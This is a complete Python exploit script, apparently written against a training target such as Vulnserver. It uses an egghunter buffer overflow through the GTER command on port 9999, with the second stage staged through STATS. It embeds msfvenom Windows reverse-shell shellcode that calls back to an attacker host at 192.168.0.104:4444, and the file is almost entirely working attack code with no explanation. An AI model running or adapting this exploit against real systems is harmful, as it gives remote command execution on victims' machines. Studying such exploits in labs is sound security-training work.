import os
import socket
import sys

host= "192.168.0.101"
port= 9999

#msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST="192.168.0.104" EXITFUNC=thread -b "\x00" -f c
shellcode = ("\xda\xcc\xd9\x74\x24\xf4\xbd\xa7\xd0\xbb\xe5\x5f\x2b\xc9\xb1"
"\x52\x83\xc7\x04\x31\x6f\x13\x03\xc8\xc3\x59\x10\xea\x0c\x1f"
"\xdb\x12\xcd\x40\x55\xf7\xfc\x40\x01\x7c\xae\x70\x41\xd0\x43"
"\xfa\x07\xc0\xd0\x8e\x8f\xe7\x51\x24\xf6\xc6\x62\x15\xca\x49"
"\xe1\x64\x1f\xa9\xd8\xa6\x52\xa8\x1d\xda\x9f\xf8\xf6\x90\x32"
"\xec\x73\xec\x8e\x87\xc8\xe0\x96\x74\x98\x03\xb6\x2b\x92\x5d"
"\x18\xca\x77\xd6\x11\xd4\x94\xd3\xe8\x6f\x6e\xaf\xea\xb9\xbe"
"\x50\x40\x84\x0e\xa3\x98\xc1\xa9\x5c\xef\x3b\xca\xe1\xe8\xf8"
"\xb0\x3d\x7c\x1a\x12\xb5\x26\xc6\xa2\x1a\xb0\x8d\xa9\xd7\xb6"
"\xc9\xad\xe6\x1b\x62\xc9\x63\x9a\xa4\x5b\x37\xb9\x60\x07\xe3"
"\xa0\x31\xed\x42\xdc\x21\x4e\x3a\x78\x2a\x63\x2f\xf1\x71\xec"
"\x9c\x38\x89\xec\x8a\x4b\xfa\xde\x15\xe0\x94\x52\xdd\x2e\x63"
"\x94\xf4\x97\xfb\x6b\xf7\xe7\xd2\xaf\xa3\xb7\x4c\x19\xcc\x53"
"\x8c\xa6\x19\xf3\xdc\x08\xf2\xb4\x8c\xe8\xa2\x5c\xc6\xe6\x9d"
"\x7d\xe9\x2c\xb6\x14\x10\xa7\x79\x40\x1a\x5f\x12\x93\x1a\x8e"
"\xbe\x1a\xfc\xda\x2e\x4b\x57\x73\xd6\xd6\x23\xe2\x17\xcd\x4e"
"\x24\x93\xe2\xaf\xeb\x54\x8e\xa3\x9c\x94\xc5\x99\x0b\xaa\xf3"
"\xb5\xd0\x39\x98\x45\x9e\x21\x37\x12\xf7\x94\x4e\xf6\xe5\x8f"
"\xf8\xe4\xf7\x56\xc2\xac\x23\xab\xcd\x2d\xa1\x97\xe9\x3d\x7f"
"\x17\xb6\x69\x2f\x4e\x60\xc7\x89\x38\xc2\xb1\x43\x96\x8c\x55"
"\x15\xd4\x0e\x23\x1a\x31\xf9\xcb\xab\xec\xbc\xf4\x04\x79\x49"
"\x8d\x78\x19\xb6\x44\x39\x39\x55\x4c\x34\xd2\xc0\x05\xf5\xbf"
"\xf2\xf0\x3a\xc6\x70\xf0\xc2\x3d\x68\x71\xc6\x7a\x2e\x6a\xba"
"\x13\xdb\x8c\x69\x13\xce")

payload = "STATS " + "GOUTGOUT" + shellcode

#sending second stage payload for egg hunter


#EGG= GOUT
egghunter= ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x47\x4f\x55\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

print "[+] sending egghunter second stage payload...."
conn2 = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
conn2.connect((host,port))
print conn2.recv(1024)
conn2.send((payload))
print conn2.recv(1024)
print "[+] DONE...."



crash = "GTER /.:/" + egghunter + "A"*115 + "\xAF\x11\x50\x62" + "\xe9\x64\xff\xff\xff" + "C"*4000

print "[+] sending main payload and triggering exploit...."

conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
conn.connect((host,port))
print conn.recv(1024)
conn.send((crash))
print conn.recv(1024)
conn.send('EXIT\r\n')
print conn.recv(1024)
conn.close()

